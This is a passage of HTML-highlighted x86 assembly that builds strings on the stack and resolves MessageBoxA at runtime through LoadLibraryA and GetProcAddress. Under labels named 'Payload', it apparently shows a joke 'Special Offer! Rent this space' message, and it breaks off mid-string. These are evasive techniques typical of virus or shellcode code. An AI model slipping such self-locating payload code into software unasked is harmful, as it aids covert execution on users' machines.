</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">04</span><span class="sc4">],</span><span class="sc3">"3"</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">05</span><span class="sc4">],</span><span class="sc3">"2"</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">06</span><span class="sc4">],</span><span class="sc3">"."</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">07</span><span class="sc4">],</span><span class="sc3">"D"</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">08</span><span class="sc4">],</span><span class="sc3">"L"</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">09</span><span class="sc4">],</span><span class="sc3">"L"</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">10</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">LoadLibraryA</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">@@_jz</span><span class="sc0"> </span><span class="sc5">e_Payload</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">0</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">00</span><span class="sc4">],</span><span class="sc3">"M"</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">01</span><span class="sc4">],</span><span class="sc3">"e"</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">02</span><span class="sc4">],</span><span class="sc3">"s"</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">03</span><span class="sc4">],</span><span class="sc3">"s"</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">04</span><span class="sc4">],</span><span class="sc3">"a"</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">05</span><span class="sc4">],</span><span class="sc3">"g"</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">06</span><span class="sc4">],</span><span class="sc3">"e"</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">07</span><span class="sc4">],</span><span class="sc3">"B"</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">08</span><span class="sc4">],</span><span class="sc3">"o"</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">09</span><span class="sc4">],</span><span class="sc3">"x"</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">10</span><span class="sc4">],</span><span class="sc3">"A"</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">11</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">0</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">GetProcAddress</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">@@_jz</span><span class="sc0"> </span><span class="sc5">e01_Payload</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">00</span><span class="sc4">],</span><span class="sc3">"S"</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">01</span><span class="sc4">],</span><span class="sc3">"p"</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">02</span><span class="sc4">],</span><span class="sc3">"e"</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">03</span><span class="sc4">],</span><span class="sc3">"c"</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">04</span><span class="sc4">],</span><span class="sc3">"i"</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">05</span><span class="sc4">],</span><span class="sc3">"a"</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">06</span><span class="sc4">],</span><span class="sc3">"l"</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">07</span><span class="sc4">],</span><span class="sc3">" "</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">08</span><span class="sc4">],</span><span class="sc3">"O"</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">09</span><span class="sc4">],</span><span class="sc3">"f"</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">10</span><span class="sc4">],</span><span class="sc3">"f"</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">11</span><span class="sc4">],</span><span class="sc3">"e"</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">],</span><span class="sc3">"r"</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">13</span><span class="sc4">],</span><span class="sc3">"!"</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">14</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">15</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">+</span><span class="sc2">00</span><span class="sc4">],</span><span class="sc3">"R"</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">+</span><span class="sc2">01</span><span class="sc4">],</span><span class="sc3">"e"</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">+</span><span class="sc2">02</span><span class="sc4">],</span><span class="sc3">"n"</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">+</span><span class="sc2">03</span><span class="sc4">],</span><span class="sc3">"t"</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">+</span><span class="sc2">04</span><span class="sc4">],</span><span class="sc3">" "</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">+</span><span class="sc2">05</span><span class="sc4">],</span><span class="sc3">"t"</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">+</span><span class="sc2">06</span><span class="sc4">],</span><span class="sc3">"h"</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">+</span><span class="sc2">07</span><span class="sc4">],</span><span class="sc3">"i"</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">+</span><span class="sc2">08</span><span class="sc4">],</span><span class="sc3">"s"</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">+</span><span class="sc2">09</span><span class="sc4">],</span><span class="sc3">" "</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">+</span><span class="sc2">10</span><span class="sc4">],</span><span class="sc3">"s"</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">+</span><span class="sc2">11</span><span class="sc4">],</span><span class="sc3">"p"</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">],</span><span class="sc3">"a"</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">+</span><span class="sc2">13</span><span class="sc4">],</span><span class="sc3">"c"</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">+</span><span class="sc2">14</span><span class="sc4">],</span><span class="sc3">"e"</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">+</span><span class="sc2">15</span><span class="sc4">],</span><span class="sc3">" "</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">],</span><span class="sc3">"f"</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">+</span><span class="sc2">17</span><span class="sc4">],</span><span class="sc3">"o"</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">+</span><span class="sc2">18</span><span class="sc4">],</span><span class="sc3">"r"</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">+</span><span class="sc2">19</span><span class="sc4">],</span><span class="sc3">" "</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">+</span><span class="sc2">20</span><span class="sc4">],</span><span class="sc3">"o"</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">+</span><span class="sc2">21</span><span class="sc4">],</span><span class="sc3">"n"</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">+</span><span class="sc2">22</span><span class="sc4">],</span><span class="sc3">"l"</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">+</span><span class="sc2">23</span><span class="sc4">],</span><span class="sc3">"y"</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">+</span><span class="sc2">24</span><span class="sc4">],</span><span class="sc3">" "</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">+</span><span class="sc2">25</span><span class="sc4">],</span><span class="sc3">"5"</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">+</span><span class="sc2">26</span><span class="sc4">],</span><span class="sc3">"$"</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">+</span><span class="sc2">27</span><span class="sc4">],</span><span class="sc3">" "</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">+</span><span class="sc2">28</span><span class="sc4">],</span><span class="sc3">"p"</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">+</span><span class="sc2">29</span><span class="sc4">],</span><span class="sc3">"e"</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">+</span><span class="sc2">30</span><span class="sc4">],</span><span class="sc3">"r"</span><span class="sc0">
